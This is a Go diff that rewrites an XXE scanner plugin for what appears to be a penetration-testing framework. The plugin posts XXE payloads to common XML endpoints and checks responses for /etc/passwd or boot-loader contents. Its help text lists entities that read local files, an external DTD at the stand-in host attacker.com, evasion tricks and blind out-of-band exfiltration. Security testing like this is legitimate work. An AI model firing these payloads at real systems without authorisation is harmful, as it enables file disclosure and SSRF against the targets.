@@ -258,43 +258,170 @@ func (r *XXEResult) String() string {
 	return msg
 }
 
-type xxePlugin struct{}
+// XXEScannerPlugin implements the Plugin interface for XXE scanning
+// (for parametric/intelligent shell)
+type xxeScannerPlugin struct{}
 
-func (p *xxePlugin) Name() string { return "XXEScanner" }
-func (p *xxePlugin) Description() string {
+func (p *xxeScannerPlugin) Name() string { return "XXEScanner" }
+func (p *xxeScannerPlugin) Description() string {
 	return "Scans for XML External Entity (XXE) vulnerabilities"
 }
-func (p *xxePlugin) Category() string { return "web-vuln" }
-func (p *xxePlugin) Options() []core.ModuleOption {
+func (p *xxeScannerPlugin) Category() string { return "web" }
+func (p *xxeScannerPlugin) Options() []core.ModuleOption {
 	return []core.ModuleOption{
-		{Name: "endpoints", Type: "string", Default: "", Description: "Comma-separated custom endpoints to test", Required: false},
-		{Name: "payloads", Type: "string", Default: "", Description: "Comma-separated custom XXE payloads", Required: false},
-		{Name: "timeout", Type: "string", Default: "15s", Description: "HTTP request timeout", Required: false},
-		{Name: "check_files", Type: "bool", Default: true, Description: "Include file disclosure payloads", Required: false},
-		{Name: "check_ssrf", Type: "bool", Default: true, Description: "Include SSRF via XXE payloads", Required: false},
+		{Name: "payload", Type: "string", Default: xxePayloads[0], Description: "Custom XXE payload (leave blank for all)", Required: false},
+		{Name: "endpoints", Type: "string", Default: "/api/xml,/upload,/soap,/rest", Description: "Comma-separated endpoints to test (relative to target)", Required: false},
+		{Name: "method", Type: "string", Default: "POST", Description: "HTTP method (POST/PUT)", Required: false},
+		{Name: "timeout", Type: "string", Default: "5s", Description: "Request timeout (e.g. 5s)", Required: false},
 	}
 }
-func (p *xxePlugin) Run(target string, options map[string]interface{}) (interface{}, error) {
-	var customEndpoints []string
-	var customPayloads []string
 
-	if endpoints, ok := options["endpoints"].(string); ok && endpoints != "" {
-		customEndpoints = strings.Split(endpoints, ",")
-		for i := range customEndpoints {
-			customEndpoints[i] = strings.TrimSpace(customEndpoints[i])
+func (p *xxeScannerPlugin) Run(target string, options map[string]interface{}) (interface{}, error) {
+	payloads := xxePayloads
+	if val, ok := options["payload"]; ok {
+		if s, ok := val.(string); ok && s != "" {
+			payloads = []string{s}
+		}
+	}
+	endpoints := []string{"/api/xml", "/upload", "/soap", "/rest"}
+	if val, ok := options["endpoints"]; ok {
+		if s, ok := val.(string); ok && s != "" {
+			parts := strings.Split(s, ",")
+			for i := range parts {
+				parts[i] = strings.TrimSpace(parts[i])
+			}
+			endpoints = parts
+		}
+	}
+	method := "POST"
+	if val, ok := options["method"]; ok {
+		if s, ok := val.(string); ok && (s == "POST" || s == "PUT") {
+			method = s
+		}
+	}
+	timeout := 5 * time.Second
+	if val, ok := options["timeout"]; ok {
+		if s, ok := val.(string); ok && s != "" {
+			if d, err := time.ParseDuration(s); err == nil {
+				timeout = d
+			}
 		}
 	}
 
-	if payloads, ok := options["payloads"].(string); ok && payloads != "" {
-		customPayloads = strings.Split(payloads, ",")
-		for i := range customPayloads {
-			customPayloads[i] = strings.TrimSpace(customPayloads[i])
-		}
+	result := &XXEResult{
+		Target:          target,
+		Vulnerable:      false,
+		TestedEndpoints: []string{},
+		Vulnerabilities: []XXEVuln{},
 	}
 
-	return XXEScan(target, customEndpoints, customPayloads), nil
+	client := &http.Client{Timeout: timeout}
+	for _, endpoint := range endpoints {
+		url := strings.TrimRight(target, "/") + endpoint
+		result.TestedEndpoints = append(result.TestedEndpoints, url)
+		for _, payload := range payloads {
+			var req *http.Request
+			if method == "POST" {
+				req, _ = http.NewRequest("POST", url, bytes.NewBuffer([]byte(payload)))
+			} else {
+				req, _ = http.NewRequest("PUT", url, bytes.NewBuffer([]byte(payload)))
+			}
+			req.Header.Set("Content-Type", "application/xml")
+			resp, err := client.Do(req)
+			if err != nil {
+				continue
+			}
+			body, _ := io.ReadAll(resp.Body)
+			resp.Body.Close()
+			// Simple evidence: look for /etc/passwd, Windows hosts, or payload echo
+			found := false
+			var evidence string
+			if strings.Contains(string(body), "root:x:") || strings.Contains(string(body), "[boot loader]") || strings.Contains(string(body), payload) {
+				found = true
+				evidence = string(body)
+			}
+			if found {
+				result.Vulnerable = true
+				result.Vulnerabilities = append(result.Vulnerabilities, XXEVuln{
+					Endpoint:     url,
+					Payload:      payload,
+					Method:       method,
+					StatusCode:   resp.StatusCode,
+					ResponseBody: string(body),
+					Evidence:     evidence,
+				})
+			}
+			time.Sleep(300 * time.Millisecond)
+		}
+	}
+	if result.Vulnerable {
+		result.Note = "XXE vulnerability detected! Review evidence."
+	} else {
+		result.Note = "No XXE vulnerabilities detected."
+	}
+	return result, nil
+}
+
+func (p *xxeScannerPlugin) Help() string {
+	return `
+📄 XXE Scanner - XML External Entity Vulnerability Detector
+
+DESCRIPTION:
+  Detects XML External Entity (XXE) vulnerabilities where applications parse XML input
+  without proper validation, potentially exposing sensitive files and internal systems.
+
+USAGE:
+  xxe <target_url> [options]
+
+EXAMPLES:
+  xxe https://example.com/upload
+  xxe https://example.com/api/xml --timeout 10s
+  xxe https://example.com/parser --payload custom
+
+ATTACK SCENARIOS:
+  • File Disclosure: Read sensitive files (/etc/passwd, web.config)
+  • SSRF: Access internal services and networks
+  • DoS: Billion laughs attack causing resource exhaustion
+  • Port Scanning: Enumerate internal network services
+
+XXE PAYLOAD TYPES:
+  • Classic File Read: <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  • External DTD: <!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">
+  • Parameter Entity: <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+  • CDATA Extraction: Use CDATA to extract binary files
+  • Blind XXE: Out-of-band data exfiltration
+
+EVASION TECHNIQUES:
+  • Encoding: Use different XML encodings (UTF-16, UTF-32)
+  • Entity Nesting: Nested entity references
+  • Protocol Bypass: Use different protocols (ftp://, http://, expect://)
+  • DTD Pollution: Override internal DTDs with external ones
+
+PRO TIPS:
+  💡 Test all XML input points (uploads, APIs, config files)
+  💡 Check for different response times indicating file access
+  💡 Look for error messages revealing system information
+  💡 Test with both internal and external entity references
+  💡 Use out-of-band techniques for blind XXE detection
+  💡 Check for partial file content in error messages
+
+DETECTION METHODS:
+  • Direct: Look for file contents in response
+  • Error-based: Analyze error messages for file access attempts
+  • Time-based: Monitor response delays for file operations
+  • Out-of-band: Use external services to detect blind XXE
+
+COMMON VULNERABLE ENDPOINTS:
+  • File upload with XML processing
+  • API endpoints accepting XML
+  • Configuration file parsers
+  • Document conversion services
+  • SOAP web services
+
+RISK LEVEL: High to Critical (file disclosure, SSRF, DoS)
+`
 }
 
 func init() {
-	core.RegisterPlugin(&xxePlugin{})
+	core.RegisterPlugin(&xxeScannerPlugin{})
 }
